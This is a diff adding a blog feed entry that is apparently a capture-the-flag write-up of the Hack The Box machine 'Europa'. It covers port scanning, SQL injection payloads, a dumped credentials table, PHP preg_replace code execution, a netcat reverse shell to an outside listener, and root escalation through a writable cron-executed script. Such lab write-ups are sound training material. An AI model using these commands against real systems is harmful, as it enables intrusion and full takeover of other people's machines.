@@ -4,9 +4,138 @@
         <title></title>
         <link>undefined</link>
         <description>undefined</description>
-        <lastBuildDate>Mon, 14 Oct 2024 15:26:52 GMT</lastBuildDate>
+        <lastBuildDate>Mon, 14 Oct 2024 21:05:31 GMT</lastBuildDate>
         <docs>https://validator.w3.org/feed/docs/rss2.html</docs>
         <generator>Joplin Pages Publisher</generator>
+        <item>
+            <title><![CDATA[Europa]]></title>
+            <guid>a9533d4964fa44b4903c9bca530901e5</guid>
+            <pubDate>Mon, 14 Oct 2024 16:02:11 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p>Let’s explore Europa. Looks a bit like Apache default page if you ask me.</p>
+<p><img src="/_resources/59947c32f7724f2788579a361cad79e3.png" /></p>
+<div><pre class="hljs"><code>$nmap -p- -A <span class="hljs-number">10.129</span><span class="hljs-number">.166</span><span class="hljs-number">.9</span>
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) <span class="hljs-built_in">at</span> <span class="hljs-number">2024</span><span class="hljs-number">-10</span><span class="hljs-number">-14</span> <span class="hljs-number">16</span>:<span class="hljs-number">10</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.166</span><span class="hljs-number">.9</span>
+Host is up (<span class="hljs-number">0.034</span>s latency).
+Not shown: <span class="hljs-number">65532</span> filtered tcp ports (no-response)
+PORT    STATE SERVICE  VERSION
+<span class="hljs-number">22</span>/tcp  open  ssh      OpenSSH <span class="hljs-number">7.2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2<span class="hljs-number">.2</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| <span class="hljs-type">ssh</span>-hostkey: 
+|   <span class="hljs-type">2048</span> <span class="hljs-number">6</span>b:<span class="hljs-number">55</span>:<span class="hljs-number">42</span>:<span class="hljs-number">0</span>a:f7:<span class="hljs-number">06</span>:<span class="hljs-number">8</span>c:<span class="hljs-number">67</span>:c0:e2:<span class="hljs-number">5</span>c:<span class="hljs-number">05</span>:db:<span class="hljs-number">09</span>:fb:<span class="hljs-number">78</span> (RSA)
+|   <span class="hljs-type">256</span> b1:ea:<span class="hljs-number">5</span>e:c4:<span class="hljs-number">1</span>c:<span class="hljs-number">0</span>a:<span class="hljs-number">96</span>:<span class="hljs-number">9</span>e:<span class="hljs-number">93</span>:db:<span class="hljs-number">1</span>d:ad:<span class="hljs-number">22</span>:<span class="hljs-number">50</span>:<span class="hljs-number">74</span>:<span class="hljs-number">75</span> (ECDSA)
+|<span class="hljs-type">_</span>  <span class="hljs-number">256</span> <span class="hljs-number">33</span>:<span class="hljs-number">1</span>f:<span class="hljs-number">16</span>:<span class="hljs-number">8</span>d:c0:<span class="hljs-number">24</span>:<span class="hljs-number">78</span>:<span class="hljs-number">5</span>f:<span class="hljs-number">5</span>b:f5:<span class="hljs-number">6</span>d:<span class="hljs-number">7</span>f:f7:b4:f2:e5 (ED25519)
+<span class="hljs-number">80</span>/tcp  open  http     Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))
+|<span class="hljs-type">_http</span>-title: Apache2 Ubuntu Default Page: It works
+|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)
+<span class="hljs-number">443</span>/tcp open  ssl/http Apache httpd <span class="hljs-number">2.4</span><span class="hljs-number">.18</span> ((Ubuntu))
+| <span class="hljs-type">ssl</span>-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
+| <span class="hljs-type">Subject</span> Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
+| <span class="hljs-type">Not</span> valid <span class="hljs-built_in">before</span>: <span class="hljs-number">2017</span><span class="hljs-number">-04</span><span class="hljs-number">-19</span>T09:<span class="hljs-number">06</span>:<span class="hljs-number">22</span>
+|<span class="hljs-type">_Not</span> valid <span class="hljs-built_in">after</span>:  <span class="hljs-number">2027</span><span class="hljs-number">-04</span><span class="hljs-number">-17</span>T09:<span class="hljs-number">06</span>:<span class="hljs-number">22</span>
+|<span class="hljs-type">_http</span>-title: Apache2 Ubuntu Default Page: It works
+|<span class="hljs-type">_ssl</span>-date: TLS randomness does not represent <span class="hljs-built_in">time</span>
+|<span class="hljs-type">_http</span>-server-header: Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.18</span> (Ubuntu)
+| <span class="hljs-type">tls</span>-alpn: 
+|<span class="hljs-type">_</span>  http/<span class="hljs-number">1.1</span>
+Service <span class="hljs-keyword">Info</span>: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<p>So I’ve added europacorp.htb to the dnsmasq and tried out then the newly found <a title="https://admin-portal.europacorp.htb" href="https://admin-portal.europacorp.htb">https://admin-portal.europacorp.htb</a>, I got a log in page.</p>
+<p><img src="/_resources/f45e49a82b474b47853d80a6fac93b44.png" /></p>
+<p>I run sqlmap against it and <code>got a 302 redirect to 'https://admin-portal.europacorp.htb/dashboard.php</code>. Going to it, we just seem to be logged in and are able to use the whole site. We also get dump of users database.</p>
+<div><pre class="hljs"><code><span class="hljs-string">custom)</span> <span class="hljs-string">POST</span> <span class="hljs-string">parameter</span> <span class="hljs-string">'#1*'</span> <span class="hljs-string">is</span> <span class="hljs-string">vulnerable.</span> <span class="hljs-string">Do</span> <span class="hljs-string">you</span> <span class="hljs-string">want</span> <span class="hljs-string">to</span> <span class="hljs-string">keep</span> <span class="hljs-string">testing</span> <span class="hljs-string">the</span> <span class="hljs-string">others</span> <span class="hljs-string">(if</span> <span class="hljs-string">any)?</span> [<span class="hljs-string">y/N</span>] 
+<span class="hljs-string">sqlmap</span> <span class="hljs-string">identified</span> <span class="hljs-string">the</span> <span class="hljs-string">following</span> <span class="hljs-string">injection</span> <span class="hljs-string">point(s)</span> <span class="hljs-string">with</span> <span class="hljs-string">a</span> <span class="hljs-string">total</span> <span class="hljs-string">of</span> <span class="hljs-number">408</span> <span class="hljs-string">HTTP(s)</span> <span class="hljs-attr">requests:</span>
+<span class="hljs-meta">---</span>
+<span class="hljs-attr">Parameter:</span> <span class="hljs-comment">#1* ((custom) POST)</span>
+    <span class="hljs-attr">Type:</span> <span class="hljs-string">boolean-based</span> <span class="hljs-string">blind</span>
+    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">RLIKE</span> <span class="hljs-string">boolean-based</span> <span class="hljs-string">blind</span> <span class="hljs-bullet">-</span> <span class="hljs-string">WHERE,</span> <span class="hljs-string">HAVING,</span> <span class="hljs-string">ORDER</span> <span class="hljs-string">BY</span> <span class="hljs-string">or</span> <span class="hljs-string">GROUP</span> <span class="hljs-string">BY</span> <span class="hljs-string">clause</span>
+    <span class="hljs-attr">Payload:</span> <span class="hljs-string">email=test@test.com'</span> <span class="hljs-string">RLIKE</span> <span class="hljs-string">(SELECT</span> <span class="hljs-string">(CASE</span> <span class="hljs-string">WHEN</span> <span class="hljs-string">(6890=6890)</span> <span class="hljs-string">THEN</span> <span class="hljs-number">0x7465737440746573742e636f6d</span> <span class="hljs-string">ELSE</span> <span class="hljs-number">0x28</span> <span class="hljs-string">END))--</span> <span class="hljs-string">tdBn&amp;password=123</span>
+
+    <span class="hljs-attr">Type:</span> <span class="hljs-string">error-based</span>
+    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.6</span> <span class="hljs-string">AND</span> <span class="hljs-string">error-based</span> <span class="hljs-bullet">-</span> <span class="hljs-string">WHERE,</span> <span class="hljs-string">HAVING,</span> <span class="hljs-string">ORDER</span> <span class="hljs-string">BY</span> <span class="hljs-string">or</span> <span class="hljs-string">GROUP</span> <span class="hljs-string">BY</span> <span class="hljs-string">clause</span> <span class="hljs-string">(GTID_SUBSET)</span>
+    <span class="hljs-attr">Payload:</span> <span class="hljs-string">email=test@test.com'</span> <span class="hljs-string">AND</span> <span class="hljs-string">GTID_SUBSET(CONCAT(0x7176626271,(SELECT</span> <span class="hljs-string">(ELT(1905=1905,1))),0x71626a7871),1905)--</span> <span class="hljs-string">QaPi&amp;password=123</span>
+
+    <span class="hljs-attr">Type:</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span>
+    <span class="hljs-attr">Title:</span> <span class="hljs-string">MySQL</span> <span class="hljs-string">&gt;=</span> <span class="hljs-number">5.0</span><span class="hljs-number">.12</span> <span class="hljs-string">AND</span> <span class="hljs-string">time-based</span> <span class="hljs-string">blind</span> <span class="hljs-string">(query</span> <span class="hljs-string">SLEEP)</span>
+    <span class="hljs-attr">Payload:</span> <span class="hljs-string">email=test@test.com'</span> <span class="hljs-string">AND</span> <span class="hljs-string">(SELECT</span> <span class="hljs-number">9800 </span><span class="hljs-string">FROM</span> <span class="hljs-string">(SELECT(SLEEP(5)))zGtH)--</span> <span class="hljs-string">kcZw&amp;password=123</span>
+<span class="hljs-meta">---</span></code></pre></div>
+<div><pre class="hljs"><code>Database: admin
+Table: users
+<span class="hljs-meta">[2 entries]</span>
+<span class="hljs-code">+----+</span>----------------------<span class="hljs-code">+----------+</span>----------------------------------<span class="hljs-code">+---------------+</span>
+<span class="hljs-section">| id | email                | active   | password                         | username      |
++----+----------------------+----------+----------------------------------+---------------+</span>
+| 1  | admin@europacorp.htb | 1        | 2b6d315337f18617ba18922c0b9597ff | administrator |
+<span class="hljs-section">| 2  | john@europacorp.htb  | 1        | 2b6d315337f18617ba18922c0b9597ff | john          |
++----+----------------------+----------+----------------------------------+---------------+</span></code></pre></div>
+<p>admin pass is SuperSecretPassword!</p>
+<h1 id="dashboard">Dashboard</h1>
+<p><img src="/_resources/a28263f6f84b4b11bccf348e787f5602.png" /></p>
+<p>The only availeable tool to us is OpenVPN Config generator.</p>
+<p><img src="/_resources/9d4021f41a3040589b9133d971ca3ca4.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-attr">"openvpn":</span> {
+        <span class="hljs-attr">"vtun0":</span> {
+                <span class="hljs-attr">"local-address":</span> {
+                        <span class="hljs-attr">"10.10.10.1":</span> <span class="hljs-string">"''"</span>
+                },
+                <span class="hljs-attr">"local-port":</span> <span class="hljs-string">"1337"</span>,
+                <span class="hljs-attr">"mode":</span> <span class="hljs-string">"site-to-site"</span>,
+                <span class="hljs-attr">"openvpn-option":</span> [
+                        <span class="hljs-string">"--comp-lzo"</span>,
+                        <span class="hljs-string">"--float"</span>,
+                        <span class="hljs-string">"--ping 10"</span>,
+                        <span class="hljs-string">"--ping-restart 20"</span>,
+                        <span class="hljs-string">"--ping-timer-rem"</span>,
+                        <span class="hljs-string">"--persist-tun"</span>,
+                        <span class="hljs-string">"--persist-key"</span>,
+                        <span class="hljs-string">"--user nobody"</span>,
+                        <span class="hljs-string">"--group nogroup"</span>
+                ],
+                <span class="hljs-attr">"remote-address":</span> <span class="hljs-string">"ip_address"</span>,
+                <span class="hljs-attr">"remote-port":</span> <span class="hljs-string">"1337"</span>,
+                <span class="hljs-attr">"shared-secret-key-file":</span> <span class="hljs-string">"/config/auth/secret"</span>
+        },
+        <span class="hljs-attr">"protocols":</span> {
+                <span class="hljs-attr">"static":</span> {
+                        <span class="hljs-attr">"interface-route":</span> {
+                                <span class="hljs-attr">"ip_address/24":</span> {
+                                        <span class="hljs-attr">"next-hop-interface":</span> {
+                                                <span class="hljs-attr">"vtun0":</span> <span class="hljs-string">"''"</span>
+                                        }
+                                }
+                        }
+                }
+        }
+}</code></pre></div>
+<p>When providing any input and looking at our request in burpsuite, we can see that there is a “pattern” variable, probably for some regex, that tries to add our ipaddress to the text.</p>
+<p><img src="/_resources/b6cfcd6f430046ffa0574e9be02b8aa9.png" /></p>
+<p>Searching for “php replace in text with regex” gets us <a title="https://stackoverflow.com/questions/22040272/using-php-replace-regex-with-regex" href="https://stackoverflow.com/questions/22040272/using-php-replace-regex-with-regex">stackoverflow telling about preg_replace</a>. Looking for some ways to exploit it, I’ve found RCE on <a title="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/php-tricks-esp">hacktricks.xyz</a></p>
+<p><img src="/_resources/b814f13a9a88434e80eb7be95185dc1e.png" /></p>
+<p>I was confused for a while here and tried to terminate somehow php and put everything in the pattern field, i.e <code>pattern=/ip_address/e", "print('hello');", $text);</code>. That did not work whatsoever, but after a while I found the right way, separating it into params just like on hacktricks.</p>
+<p><img src="/_resources/f59e3e7aac9b4a29b9ce74fea68627a6.png" /></p>
+<p>Running <code>system('ls /home/')</code> gets us user John. We can’t get in via ssh, so we need to create a reverse shell. We can copy from <a title="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools" href="https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/#tools">InternalAllTheThings</a> and get <code>system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.17 4242 &gt;/tmp/f')</code>. On host run <code>nc -lvnp 4242</code>, send request and we are in.</p>
+<p><img src="/_resources/9c0f1552289e402e95f4b7030733f960.png" /></p>
+<p>Let’s get standard shell stabilisation and work towards priv esc for root. Flag can be obtained from /home/john/user.txt.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("/bin/bash")'</span>
+<span class="hljs-built_in">export</span> <span class="hljs-attribute">TERM</span>=xterm
+CTRL-Z
+stty<span class="hljs-built_in"> raw </span>-echo; fg</code></pre></div>
+<h1 id="priv-esc">Priv Esc</h1>
+<p>Running linenum we can find that there is cronjob running every minute at <code>/var/www/cronjobs/clearlogs</code>. We can’t modify it, but we can see its contents.</p>
+<div><pre class="hljs"><code><span class="hljs-meta">#!/usr/bin/php</span>
+&lt;?php
+<span class="hljs-variable">$file</span> = <span class="hljs-string">'/var/www/admin/logs/access.log'</span>;
+file_put_contents(<span class="hljs-variable">$file</span>, <span class="hljs-string">''</span>);
+<span class="hljs-built_in">exec</span>(<span class="hljs-string">'/var/www/cmd/logcleared.sh'</span>);
+?&gt;</code></pre></div>
+<p>Looking for the <code>logcleared.sh</code>, I realized that it does not exist.</p>
+<div><pre class="hljs"><code>www-data@europa:/tmp$ ls -la /var/www/cmd/             
+total 8
+drwxrwxr-x 2 root www-data 4096 May 17  2022 .
+drwxr-xr-x 6 root root     4096 May 17  2022 ..</code></pre></div>
+<p>Let’s make one then with <code>echo "chmod u+s /bin/bash" &gt; logcleared.sh</code>, set <code>chmod 777 logcleared.sh</code> and wait a minute. Then, run <code>/bin/bash -p</code> to get root and we are done here.</p>
+<p><img src="/_resources/7f8496125b724ee3b09da4af403e727f.png" /></p>
+]]></content:encoded>
+        </item>
         <item>
             <title><![CDATA[Valentine]]></title>
             <guid>07cc2e031d394951b83b760f7e8af61f</guid>
